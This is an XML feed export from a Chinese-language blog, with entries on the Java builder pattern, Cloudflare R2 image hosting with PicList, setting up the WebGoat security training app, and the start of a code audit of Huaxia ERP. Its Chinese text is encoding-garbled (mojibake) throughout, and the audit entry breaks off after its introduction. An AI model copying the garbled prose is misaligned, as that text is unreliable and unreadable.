    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å­¦ç”Ÿç±»çš„å±æ€§éå¸¸å¤šï¼Œå¯¼è‡´æ„é€ å‡½æ•°ï¼Œä¹Ÿéå¸¸å¤šï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡newçš„æ–¹å¼åˆ›å»ºå¾ˆå®¹æ˜“å¡«é”™å‚æ•°ä½ç½®ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL æ˜¥å­£èµ›å† å†›&quot;</span>,<span class="hljs-string">&quot;ä¸Šæµ·Majorå† å†›&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;å°æ˜&quot;</span>, <span class="hljs-string">&quot;ç”·&quot;</span>, <span class="hljs-string">&quot;è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯&quot;</span>, awards);<br>        System.out.println(student);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="å»ºé€ è€…æ¨¡å¼"><a href="#å»ºé€ è€…æ¨¡å¼" class="headerlink" title="å»ºé€ è€…æ¨¡å¼"></a>å»ºé€ è€…æ¨¡å¼</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StudentBuilder <span class="hljs-title function_">builder</span><span class="hljs-params">()</span> &#123;  <span class="hljs-comment">//é€šè¿‡builderç›´æ¥è·å–å»ºé€ è€…</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StudentBuilder</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentBuilder</span> &#123;<br>        <span class="hljs-type">int</span> id;<br>        <span class="hljs-type">int</span> age;<br>        String name;<br>        String gender;<br>        String profession;<br>        List&lt;String&gt; awards;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">id</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>            <span class="hljs-built_in">this</span>.id = id;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">age</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>            <span class="hljs-built_in">this</span>.age = age;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">name</span><span class="hljs-params">(String name)</span> &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">gender</span><span class="hljs-params">(String gender)</span> &#123;<br>            <span class="hljs-built_in">this</span>.gender = gender;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">profession</span><span class="hljs-params">(String profession)</span> &#123;<br>            <span class="hljs-built_in">this</span>.profession = profession;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> StudentBuilder <span class="hljs-title function_">awards</span><span class="hljs-params">(List&lt;String&gt; awards)</span> &#123;<br>            <span class="hljs-built_in">this</span>.awards = awards;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Student <span class="hljs-title function_">build</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(id, age, name, gender, profession, awards);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Student.<span class="hljs-type">StudentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> Student.builder();<br>        List&lt;String&gt; awards = Arrays.asList(<span class="hljs-string">&quot;LPL æ˜¥å­£èµ›å† å†›&quot;</span>, <span class="hljs-string">&quot;ä¸Šæµ·Majorå† å†›&quot;</span>);<br>        builder.id(<span class="hljs-number">1</span>).name(<span class="hljs-string">&quot;John Doe&quot;</span>).gender(<span class="hljs-string">&quot;Male&quot;</span>).awards(awards).profession(<span class="hljs-string">&quot;&quot;</span>).build();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><strong>å»ºé€ è€…æ¨¡å¼æä¾›äº†ä¸€ç§æ¸…æ™°ã€çµæ´»ä¸”æ˜“äºç»´æŠ¤çš„æ–¹å¼æ¥æ„å»ºå¯¹è±¡ï¼Œå°¤å…¶é€‚ç”¨äºå…·æœ‰å¤šä¸ªå‚æ•°å’Œå¤æ‚æ„å»ºé€»è¾‘çš„æƒ…å†µã€‚</strong></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨Cloudflare R2æ­å»ºå›¾åºŠ</title>
    <url>/2024/07/08/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E5%88%A9%E7%94%A8Cloudflare%20R2%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰åšå®¢éƒ½æ˜¯é€šè¿‡GitHubå®ç°å›¾åºŠçš„ï¼Œä½†æ˜¯å›½å†…è®¿é—®å›¾ç‰‡çš„é€Ÿåº¦å®åœ¨æ˜¯ä¸æ•¢æ­ç»´ï¼›å¦å¤–GitHubå…¶å®æ˜¯ä¸å…è®¸åšå›¾åºŠçš„ï¼Œå½“åº“è¶…è¿‡1Gä»¥åä¼šæœ‰äººå·¥å®¡æŸ¥ï¼Œå‘ç°æ˜¯å›¾åºŠå¯èƒ½ä¼šåˆ åº“ï¼Œç”šè‡³å°å¸å·ï¼›</p>
<h2 id="å‰æœŸè§£å†³æ–¹æ¡ˆ"><a href="#å‰æœŸè§£å†³æ–¹æ¡ˆ" class="headerlink" title="å‰æœŸè§£å†³æ–¹æ¡ˆ"></a>å‰æœŸè§£å†³æ–¹æ¡ˆ</h2><p>æ€»ä½“æ¥çœ‹æœ‰å‡ ä¸ªè§£å†³æ–¹æ³•</p>
<p>é˜¿é‡Œäº‘oss	è…¾è®¯äº‘cos	ä¸ƒç‰›äº‘	åˆæ‹äº‘</p>
<p>ä¸ƒç‰›äº‘æœ‰å…è´¹çš„é¢åº¦ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸å¤‡æ¡ˆçš„åŸŸåï¼Œä½†æ˜¯è¿™æ ·çš„è¯å›¾ç‰‡é€Ÿåº¦æ¯”Githubè¿˜æ…¢</p>
<p>åˆæ‹äº‘éœ€è¦ç½‘ç«™å¤‡æ¡ˆï¼ŒåŠ å…¥åˆæ‹äº‘è”ç›Ÿæ‰æœ‰å…è´¹é¢åº¦ï¼Œåˆæ‹äº‘è”ç›Ÿéœ€è¦åœ¨ä½ çš„ç½‘ç«™ä¸ŠåŠ ä¸Šä»–ä»¬çš„å¹¿å‘Šå’Œéœ€è¦æ‰‹æŒè¯ä»¶ç…§æ‹ç…§å®¡æ ¸</p>
<p>ç»¼ä¸Šï¼Œå‰æœŸæˆ‘ç”¨çš„ç¬¬ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯è…¾è®¯äº‘çš„cosæ¡¶ï¼Œç±»ä¼¼çš„è¿˜æœ‰é˜¿é‡Œäº‘çš„ossï¼Œä»·æ ¼å…¶å®ä¹Ÿä¸è´µ</p>
<p>ä½†æ˜¯å½“æˆ‘éƒ¨ç½²å®Œäº†ï¼Œå»æµè§ˆå™¨æ‰“å¼€å›¾ç‰‡è¿æ¥å‘ç°ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä¸‹è½½å›¾ç‰‡ï¼Œä¸èƒ½é¢„è§ˆï¼Œç¿»äº†åŠå¤©cosä»‹ç»æ‰çŸ¥é“ï¼ŒåŸŸåæ²¡å¤‡æ¡ˆçš„ä¸æ”¯æŒé¢„è§ˆï¼Œæµè§ˆå™¨æ‰“å¼€è¿æ¥å°±ç›´æ¥ä¸‹è½½äº†ã€‚ç”¨äº†ä¸€æ®µæ—¶é—´ï¼Œè™½ç„¶æ²¡å•¥å¤§é—®é¢˜ï¼Œä½†æ˜¯æ€»æ„Ÿè§‰ä¸çˆ½ã€‚</p>
<p>æ€»ä½“æ¥è¯´ä¸Šé¢çš„æ–¹æ¡ˆéƒ½éœ€è¦å¤‡æ¡ˆæ‰èƒ½æœ‰è‰¯å¥½çš„ä½¿ç”¨ä½“éªŒã€‚</p>
<p>äºæ˜¯æœ€åè½¬å‘äº†<strong>Cloudflare</strong>çš„æ€€æŠ±</p>
<p>ä¼˜åŠ¿æ˜¯ï¼š</p>
<p>ç½‘ç«™ä¸éœ€è¦å¤‡æ¡ˆï¼Œæœ‰å…è´¹é¢åº¦</p>
<p>å›¾ç‰‡å“åº”é€Ÿåº¦å¿«</p>
<p><strong>R2 å®šä»·</strong></p>
<table>
<thead>
<tr>
<th>ã…¤</th>
<th>å…è´¹</th>
<th>è¶…å‡ºéƒ¨åˆ†&#x2F;æœˆè´¹</th>
</tr>
</thead>
<tbody><tr>
<td>å­˜å‚¨</td>
<td>10 GB&#x2F;æœˆ</td>
<td>0.015 ç¾å…ƒ&#x2F;GB</td>
</tr>
<tr>
<td>A ç±»æ“ä½œ</td>
<td>100 ä¸‡æ¬¡&#x2F;æœˆ</td>
<td>4.50 ç¾å…ƒ&#x2F;ç™¾ä¸‡æ¬¡</td>
</tr>
<tr>
<td>B ç±»æ“ä½œ</td>
<td>1000 ä¸‡æ¬¡&#x2F;æœˆ</td>
<td>0.36 ç¾å…ƒ&#x2F;ç™¾ä¸‡æ¬¡</td>
</tr>
</tbody></table>
<h2 id="ä½¿ç”¨Cloudflare-R2çš„å‰æœŸå‡†å¤‡"><a href="#ä½¿ç”¨Cloudflare-R2çš„å‰æœŸå‡†å¤‡" class="headerlink" title="ä½¿ç”¨Cloudflare R2çš„å‰æœŸå‡†å¤‡"></a>ä½¿ç”¨Cloudflare R2çš„å‰æœŸå‡†å¤‡</h2><p><a href="https://github.com/Kuingsmile/PicList">PicList</a></p>
<p><a href="https://www.paypal.com/">paypal</a></p>
<p>åŸŸå(å¯ä¸å¤‡æ¡ˆ)</p>
<h2 id="ç¬¬ä¸€ä¸ªå‘ç‚¹"><a href="#ç¬¬ä¸€ä¸ªå‘ç‚¹" class="headerlink" title="ç¬¬ä¸€ä¸ªå‘ç‚¹"></a>ç¬¬ä¸€ä¸ªå‘ç‚¹</h2><p>å…¶å®ä¹‹å‰å¾ˆæ—©å°±æ³¨å†Œ<strong>Cloudflare</strong>äº†ï¼Œä¸Šå»çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šè‡ªå·±ä¸æ˜¯å¾ˆäº†è§£çš„ä¸œè¥¿ï¼Œå°±ç•™åœ¨æ¸©æŸ”ä¹¡äº†ã€‚ã€‚ã€‚ç»§ç»­ä½¿ç”¨cosæ¡¶ï¼›å¦ä¸€ä¸ªé—®é¢˜æ˜¯ä¹‹å‰å¬è¿‡åˆ›å»ºR2å­˜å‚¨ç”¨paypalå°±è¡Œï¼Œä½†æ˜¯æˆ‘ä¸Šå»çœ‹å¿…é¡»è¦ä¿¡ç”¨å¡ï¼Œé‚æ”¾å¼ƒã€‚</p>
<p>å¶ç„¶å‘ç°æ˜¯æ¢¯å­çš„é—®é¢˜</p>
<p>ä¸ªäººä¹ æƒ¯æ¢¯å­å¼€æœºè‡ªå¯ï¼Œä¹ æƒ¯è°·æ­Œï¼Œæœç»ç™¾åº¦</p>
<p>å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å‡ºç°paypalçš„é€‰é¡¹</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144516183.png" alt="image-20240628144516183"></p>
<p>ä¸å¼€æ¢¯å­å°±å¯ä»¥ä½¿ç”¨paypalä»˜æ¬¾äº†</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144701802.png" alt="image-20240628144701802"></p>
<h2 id="ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare"><a href="#ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare" class="headerlink" title="ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare"></a>ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare</h2><p>é¦–å…ˆéœ€è¦æŠŠä½ çš„åŸŸåæ·»åŠ åˆ°<strong>Cloudflare</strong></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png" alt="image-20240628145013147"></p>
<p>é€‰æ‹©å…è´¹çš„è®¡åˆ’å°±è¡Œï¼Œéšåä¼šåˆ†é…ä¸¤ä¸ªdnsæœåŠ¡å™¨</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145259856.png" alt="image-20240628145259856"></p>
<p>ç›´æ¥å»åŸŸåçš„æœåŠ¡å•†é‚£é‡Œæ”¹æˆè¿™<strong>Cloudflare</strong>çš„DNSåœ°å€</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145524103.png" alt="image-20240628145524103"></p>
<p>å¦å¤–ä½¿ç”¨CFä¹‹åå‘ç°ï¼Œç½‘ç«™åŠ è½½é€Ÿåº¦å¾ˆæ…¢ã€‚æŠŠAè®°å½•å’ŒCNAMEè®¾ç½®ä¸ºä»…DNSå°±è¡Œ</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151002609.png" alt="image-20240628151002609"></p>
<h2 id="åˆ›å»ºå­˜å‚¨æ¡¶"><a href="#åˆ›å»ºå­˜å‚¨æ¡¶" class="headerlink" title="åˆ›å»ºå­˜å‚¨æ¡¶"></a>åˆ›å»ºå­˜å‚¨æ¡¶</h2><p>ä½ç½®é€‰æ‹© äºšå¤ªåœ°åŒº</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151346032.png" alt="image-20240628151346032"></p>
<p>R2åˆ›å»ºå®Œä¹‹åï¼Œè®¾ç½®è¿æ¥åŸŸåï¼Œè¾“å…¥åˆšåˆšæ·»åŠ çš„åŸŸåçš„ä¸‰çº§åŸŸåï¼Œæ¯”å¦‚ a.com å†™ä¸ºimage.a.comï¼Œ<strong>Cloudflare</strong>ä¼šè‡ªåŠ¨æ·»åŠ è®°å½•ï¼Œç”¨è¿™ä¸ªåŸŸåå°±å¯ä»¥è®¿é—®R2å­˜å‚¨çš„å†…å®¹</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151514382.png" alt="image-20240628151514382"></p>
<p>æ¥ç€æ·»åŠ ä¸€ä¸ªç®¡ç†ä»¤ç‰Œ</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151750145.png" alt="image-20240628151750145"></p>
<p>å‰©ä¸‹çš„é»˜è®¤å³å¯</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151925647.png" alt="image-20240628151925647"></p>
<h2 id="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ"><a href="#PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ" class="headerlink" title="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ"></a>PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ</h2><p>ä¸¥æ ¼æŒ‰ç…§å¦‚å›¾æ‰€ç¤ºä½ç½®å¡«å†™</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628152607640.png" alt="image-20240628152607640"></p>
<p>ä¸Šä¼ è·¯å¾„å¯ä»¥æ ¹æ®è¡¨è‡ªå·±ç»„åˆå¡«å†™</p>
<table>
<thead>
<tr>
<th align="center">payload</th>
<th align="center">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&#123;year&#125;</code></td>
<td align="center">å½“å‰æ—¥æœŸ - å¹´</td>
</tr>
<tr>
<td align="center"><code>&#123;month&#125;</code></td>
<td align="center">å½“å‰æ—¥æœŸ - æœˆ</td>
</tr>
<tr>
<td align="center"><code>&#123;day&#125;</code></td>
<td align="center">å½“å‰æ—¥æœŸ - æ—¥</td>
</tr>
<tr>
<td align="center"><code>&#123;fullName&#125;</code></td>
<td align="center">å®Œæ•´æ–‡ä»¶åï¼ˆå«æ‰©å±•åï¼‰</td>
</tr>
<tr>
<td align="center"><code>&#123;fileName&#125;</code></td>
<td align="center">æ–‡ä»¶åï¼ˆä¸å«æ‰©å±•åï¼‰</td>
</tr>
<tr>
<td align="center"><code>&#123;extName&#125;</code></td>
<td align="center">æ‰©å±•åï¼ˆä¸å«.ï¼‰</td>
</tr>
<tr>
<td align="center"><code>&#123;md5&#125;</code></td>
<td align="center">å›¾ç‰‡ MD5 è®¡ç®—å€¼</td>
</tr>
<tr>
<td align="center"><code>&#123;sha1&#125;</code></td>
<td align="center">å›¾ç‰‡ SHA1 è®¡ç®—å€¼</td>
</tr>
<tr>
<td align="center"><code>&#123;sha256&#125;</code></td>
<td align="center">å›¾ç‰‡ SHA256 è®¡ç®—å€¼</td>
</tr>
<tr>
<td align="center"><code>&#123;timestamp&#125;</code></td>
<td align="center">Unix æ—¶é—´æˆ³</td>
</tr>
<tr>
<td align="center"><code>&#123;timestampMS&#125;</code></td>
<td align="center">Unix æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</td>
</tr>
</tbody></table>
<p>åœ°åŒºå› ä¸ºé€‰æ‹©äºšå¤ªåœ°åŒºæ‰€æœ‰å¡«å†™ apac</p>
<p><strong>è‡ªå®šä¹‰åŸŸåå†™åˆšåˆšçš„ä¸‰çº§åŸŸåå¦‚:<a href="http://image.a.com/">http://image.a.com</a></strong></p>
<hr>
<h3 id="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•"><a href="#PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•" class="headerlink" title="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•"></a>PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•</h3><p>ä¹‹å‰è®¾ç½®<strong>PicList</strong>è‡ªå®šä¹‰èŠ‚ç‚¹ä½¿ç”¨äº†è¿™ä¸ª S3 APIï¼Œå®ƒå…¶å®å’Œä¸Šå›¾ç®¡è¾–åœ°å€åªå·®ä¸€ä¸ªå­˜å‚¨æ¡¶çš„åå­— </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628153202851.png" alt="image-20240628153202851"></p>
<p>è€Œä¸”å¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯å›¾ç‰‡åœ¨typoraåŠ è½½ä¼šå¤±è´¥</p>
<p>éšåå°†<strong>PicList</strong>è‡ªå®šä¹‰åŸŸå<a href="http://image.a.com,æ”¹ä¸ºhttp//image.a.com/blog1">http://image.a.comï¼Œæ”¹ä¸ºhttp://image.a.com/blog1</a></p>
<p>å›¾ç‰‡æ˜¾ç¤ºæ­£å¸¸</p>
<p>ç”¨äº†ä¸€æ®µæ—¶é—´æ‰å‘ç°<strong>PicList</strong>ä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡ï¼Œçœ‹æ—¥å¿—æ²¡æœ‰çœ‹åˆ°åˆ é™¤è®°å½•</p>
<p>æœ€å¼€å§‹è°·æ­ŒåŠå¤©æ‰¾ä¸åˆ°åŸå› ï¼Œéšåæ‰¾åˆ°è¿™ä¸ªissuse:<a href="https://github.com/Kuingsmile/PicList/issues/203%E6%89%8D%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98">https://github.com/Kuingsmile/PicList/issues/203æ‰è§£å†³è¿™ä¸ªé—®é¢˜</a></p>
<p>éšå<strong>PicList</strong>ä¹Ÿå¯ä»¥æ­£å¸¸çš„åˆ é™¤äº‘ç«¯çš„å›¾ç‰‡äº†</p>
<p><strong>(æµªè´¹è´¼å¤šæ—¶é—´å»è°·æ­Œï¼Œçœ‹æ¥ä¸‹æ¬¡é‡åˆ°é—®é¢˜å¾—å…ˆå»çœ‹issuse)</strong></p>
<h2 id="ğŸ¤—Enjoyï¼"><a href="#ğŸ¤—Enjoyï¼" class="headerlink" title="ğŸ¤—Enjoyï¼"></a>ğŸ¤—Enjoyï¼</h2><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://developers.cloudflare.com/r2/">Cloudflare R2 Â· Cloudflare R2 docs</a></p>
<p><a href="https://github.com/Kuingsmile/PicList/issues/203">Bugæ— æ³•åŒæ­¥åˆ é™¤äº‘ç«¯ #203</a></p>
<p><a href="https://piclist.cn/app">PicListæ–‡æ¡£</a></p>
]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>å¥‡æŠ€æ·«å·§</tag>
      </tags>
  </entry>
  <entry>
    <title>æºç éƒ¨ç½²WebGoat</title>
    <url>/2024/05/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BA%90%E7%A0%81%E9%83%A8%E7%BD%B2Webgoat/</url>
    <content><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>WebGoaté¡¹ç›®åœ°å€: <a href="https://github.com/WebGoat/WebGoat">WebGoat</a></p>
<p>éœ€è¦JAVA17æˆ–è€…JAVA21ï¼Œå› ä¸ºSpring boot3æœ€ä½è¦æ±‚æ˜¯JAVA17.</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529143754756.png" alt="image-20240529143754756"></p>
<h3 id="ä¸‹è½½é¡¹ç›®"><a href="#ä¸‹è½½é¡¹ç›®" class="headerlink" title="ä¸‹è½½é¡¹ç›®"></a>ä¸‹è½½é¡¹ç›®</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/WebGoat/WebGoat.git<br></code></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®"><a href="#ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®" class="headerlink" title="ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®"></a>ä½¿ç”¨IDEAæ„å»ºé¡¹ç›®</h3><p>IDEAè‡ªå¸¦mavenæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦å•ç‹¬ä¸‹è½½</p>
<p>æ‰¾åˆ°<code>~/WebGoat/pom.xml</code>ç”¨ideaæ‰“å¼€ï¼Œé€‰æ‹©<code>open as peoject</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529162034060.png" alt="image-20240529162034060"></p>
<p>IDEAä¼šè‡ªåŠ¨ä¸‹è½½mavençš„ä¾èµ–ï¼Œæ—¶é—´æ¯”è¾ƒé•¿ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163502058.png" alt="image-20240529163502058"></p>
<p>ç­‰ä¾èµ–ä¸‹è½½å®Œæˆï¼Œæ‰¾åˆ°ç›®å½•ï¼š<code>src.main.java.org.owasp#webgoat.server.StartWebGoat</code>ç‚¹å‡»è¿è¡Œï¼Œè®¿é—® <a href="http://127.0.0.1:8080/WebGoat/">http://127.0.0.1:8080/WebGoat/</a> å’Œ <a href="http://127.0.0.1:9090/WebWolf/">http://127.0.0.1:9090/WebWolf/</a> å³å¯</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163537696.png" alt="image-20240529163537696"></p>
<h2 id="è§£å†³æŠ¥é”™"><a href="#è§£å†³æŠ¥é”™" class="headerlink" title="è§£å†³æŠ¥é”™"></a>è§£å†³æŠ¥é”™</h2><p>å¤§æ¦‚åŸå› æ˜¯<code>javax.management.InstanceAlreadyExistsException</code> å¯¼è‡´å¯åŠ¨å¤±è´¥ã€‚å› ä¸º JMXï¼ˆJava Management Extensionsï¼‰ä¸­çš„ MBeanï¼ˆManaged Beanï¼‰å·²ç»å­˜åœ¨äº MBean æœåŠ¡å™¨ä¸­ï¼Œå¯¼è‡´æ— æ³•é‡å¤æ³¨å†Œã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173118068.png" alt="image-20240529173118068"></p>
<p>é€‰æ‹©ç¦ç”¨JMXç«¯ç‚¹å³å¯</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173328755.png" alt="image-20240529173328755"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>åå¤ ERP CMS v2.3ä»£ç å®¡è®¡</title>
    <url>/2025/01/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8D%8E%E5%A4%8FERP_v2.3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¡¹ç›®åœ°å€:<a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">åå¤ERP_v2.3</a></p>
<p>ä»£ç å®¡è®¡æ˜¯æ¯ä¸ªå®‰å…¨ä»ä¸šè€…å¿…é¡»è¦ä¼šçš„æŠ€èƒ½ï¼Œé‚æ¥å­¦ä¹ ä¸€æ³¢</p>
